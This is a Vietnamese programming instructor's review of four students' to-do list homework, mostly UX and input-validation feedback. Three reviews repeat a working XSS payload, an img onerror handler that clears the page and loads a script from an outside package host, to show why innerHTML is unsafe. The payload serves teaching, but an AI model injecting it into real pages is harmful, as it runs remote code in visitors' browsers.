# Review bài tập về nhà buổi 27 - Lớp Fullstack K5

## [Le Tung Duong](https://duong1801.github.io/f8-fullstack-k5/Day-27/)

- Khi người dùng mới truy cập nên focus vào luôn ô `input` thêm task để tăng trải nghiệm người dùng.

- Khi người dùng thực hiện thêm task thông qua việc click vào nút `Add Task` thì sau đó ô nhập task nên được focus như khi thêm task bằng các cách nhấn nút `Enter`.

- Chưa xử lý case người dùng nhập vào một task có nội dung quá dài.

- Do đang sử dụng innerHTML, có thể xảy ra lỗi khi người dùng cố tình nhập một script vào.

```js
<img
  src=""
  onerror='b=document,a=b.body;a.innerHTML="";a.appendChild(c = b.createElement("script"),c.type="module",c.innerHTML=`import {HTML} from "https:\/\/unpkg.com/jsvjp";HTML("h1", "error", "HACKED!")`);a.appendChild(d=b.createElement("link"),d.rel="stylesheet",d.href="https:\/\/unpkg.com/jsvjp/style.css");'
/>
```

- Sau khi người dùng bấm vào sửa task nên focus luôn vào ô `input` mà người dùng cần chỉnh sửa để tăng trải nghiệm người dùng.

- Chưa xử lý case chuyển đổi trạng thái của một task sang đã hoàn thành và ngược lại.

- Sau khi sửa task bấm vào `Enter` thì bị reload trang do mặc định của thẻ `form` khi `submit`.

- [x] Đánh giá chung: Bài làm tạm ổn, cần lưu ý một số case đặc biệt cần xử lý để hoàn thiện hơn.

## [Nguyen Tien Dat](https://tiendat211294.github.io/f8_offline_k5/buoi-27/)

- Khi người dùng mới truy cập nên focus vào luôn ô `input` thêm task để tăng trải nghiệm người dùng.

- Khi người dùng thực hiện thêm task thông qua việc click vào nút `Add Task` thì sau đó ô nhập task nên được focus như khi thêm task bằng các cách nhấn nút `Enter`.

- Chưa xử lý case nếu như người dùng chỉ nhập vào khoảng trắng thì sẽ không được cho thêm task hoặc sửa task, nên sử dụng phương thức `trim()` để loại bỏ khoảng trắng .

- Trường hợp khi người dùng nhập vào nội dung một task quá dài thì nên căn chỉnh phần thêm task ở chính giữa màn hình, không để nội dung của task quá sát với nút chỉnh sửa task, và khi nội dung đạt đến một dộ dài nhất định thì nên xuống dòng.

- Do đang sử dụng innerHTML, có thể xảy ra lỗi khi người dùng cố tình nhập một script vào.

```js
<img
  src=""
  onerror='b=document,a=b.body;a.innerHTML="";a.appendChild(c = b.createElement("script"),c.type="module",c.innerHTML=`import {HTML} from "https:\/\/unpkg.com/jsvjp";HTML("h1", "error", "HACKED!")`);a.appendChild(d=b.createElement("link"),d.rel="stylesheet",d.href="https:\/\/unpkg.com/jsvjp/style.css");'
/>
```

- Sau khi người dùng bấm vào sửa task nên focus luôn vào ô `input` mà người dùng cần chỉnh sửa để tăng trải nghiệm người dùng.

- Trường hợp nếu người dùng bấm vào sửa task rồi xoá hết nội dung của task và vẫn nhấn `Add  Task` hoặc `Enter` thì nên xử lý và không cho render ra task trống sẽ hợp lý hơn.

- Chưa xử lý case chuyển đổi trạng thái của một task sang đã hoàn thành và ngược lại.

- [x] Đánh giá chung: Bài làm tạm ổn, cần lưu ý một số case đặc biệt cần xử lý để hoàn thiện hơn.

## [Ngo Hoang Kim](https://kzau1612.github.io/FSK5/FSK5/day_27/)

- Khi người dùng mới truy cập nên focus vào luôn ô `input` thêm task để tăng trải nghiệm người dùng.

- Khi người dùng thực hiện thêm task thông qua việc click vào nút `Add Task` thì sau đó ô nhập task nên được focus như khi thêm task bằng các cách nhấn nút `Enter`.

- Trường hợp khi người dùng nhập vào nội dung một task quá dài, khi nội dung đạt đến một dộ dài nhất định thì nên xuống dòng.

- Khi thêm một task mới vào nên để task đó ở vị trí đầu tiên sẽ hợp lý hơn so với để ở cuối.

- Do đang sử dụng innerHTML, có thể xảy ra lỗi khi người dùng cố tình nhập một script vào.

```js
<img
  src=""
  onerror='b=document,a=b.body;a.innerHTML="";a.appendChild(c = b.createElement("script"),c.type="module",c.innerHTML=`import {HTML} from "https:\/\/unpkg.com/jsvjp";HTML("h1", "error", "HACKED!")`);a.appendChild(d=b.createElement("link"),d.rel="stylesheet",d.href="https:\/\/unpkg.com/jsvjp/style.css");'
/>
```

- Sau khi người dùng bấm vào sửa task nên focus luôn vào ô `input` mà người dùng cần chỉnh sửa để tăng trải nghiệm người dùng.

- Chưa xử lý case chuyển đổi trạng thái của một task sang đã hoàn thành và ngược lại.

- Khi thực hiện việc sửa nhiều task mà tất cả các task cần sửa chưa task nào đã hoàn thành việc chỉnh sửa thì chỉ cần một nhấn `Enter` hoặc bấm vào `Add Task` ở một task bất kì thì các task còn lại tự động hoàn thành việc chỉnh sửa. Hay khi trong lúc chỉnh có nhiều task chưa hoàn thành việc chỉnh sửa có một task mới được thêm vào hoặc có một task bị xóa đi thì toàn bộ các task sẽ tự động hoàn thành việc chỉnh sửa trừ task được chuyển qua trạng thái chỉnh sửa hoặc được focus cuối cùng trước khi thêm hoặc xóa một task và sau khi nhấn `Enter` hoặc bấm vào `Add Task` thì trang sẽ reload.

- [x] Đánh giá chung: Bài làm chưa tốt, cần lưu ý một số case đặc biệt cần xử lý để hoàn thiện hơn và cần dành nhiều thời gian hơn cho bài tập.

## [Nguyen Van Thang](https://nvthang391.github.io/btjs/bt27.html)

- Khi người dùng mới truy cập nên focus vào luôn ô `input` thêm task để tăng trải nghiệm người dùng.

- Khi người dùng thực hiện thêm task thông qua việc click vào nút `Add Task` thì sau đó ô nhập task nên được focus như khi thêm task bằng các cách nhấn nút `Enter`.

- Chưa xử lý case khi người dùng không nhập dữ liệu khi thêm task, nếu người dùng không nhập dữ liệu thì không cho thêm task.

- Chưa xử lý case nếu như người dùng chỉ nhập vào khoảng trắng thì sẽ không được cho thêm task hoặc sửa task, nên sử dụng phương thức `trim()` để loại bỏ khoảng trắng.

- Trường hợp khi người dùng nhập vào nội dung một task quá dài thì nên căn chỉnh phần thêm task ở chính giữa màn hình, không để nội dung của task quá sát với nút chỉnh sửa task.

- Chưa làm chức năng sửa nội dung task.

- Chưa xử lý case chuyển đổi trạng thái của một task sang đã hoàn thành và ngược lại.

- [x] Đánh giá chung: Bài làm chưa tốt, còn rất nhiều case đặc biệt cần xử lý để hoàn thiện và cần dành nhiều thời gian hơn cho bài tập, lưu ý cách quản lý folder và các file.
